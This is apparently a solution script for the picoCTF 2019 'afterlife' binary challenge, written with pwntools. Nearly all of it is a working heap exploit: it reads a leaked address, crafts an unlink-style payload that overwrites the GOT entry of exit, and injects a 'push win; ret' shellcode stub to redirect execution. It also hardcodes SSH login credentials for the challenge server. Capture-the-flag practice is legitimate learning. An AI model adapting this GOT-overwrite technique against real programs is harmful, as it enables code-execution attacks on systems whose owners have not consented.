from pwn import *
import sys

argv = sys.argv
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	s = ssh(host='2019shell1.picoctf.com', user='yuvalyoBlup', password="123456789")
	sh = s.process(['./vuln', 'blup'], cwd='/problems/afterlife_5_5cb2854d168d1e297b97921c0b4231f3')
else:
	sh = process(['./vuln', 'blup'])

e = ELF('./vuln')


sh.recvuntil('Oops! a new developer copy pasted and printed an address as a decimal...\n')
address = int(sh.recvline())

exit_address_minus_12 = e.got['exit'] - 12 # The memory at FD+12 is overwritten with BK
push_win_ret = address + 8 # The memory at BK+8 is overwritten with FD
win_address = e.symbols['win'] 

payload = p32(exit_address_minus_12) + p32(push_win_ret) + asm('push {}; ret'.format(hex(win_address)))

sh.sendlineafter("you will write on first after it was freed... an overflow will not be very useful...", payload)

print sh.recvall()




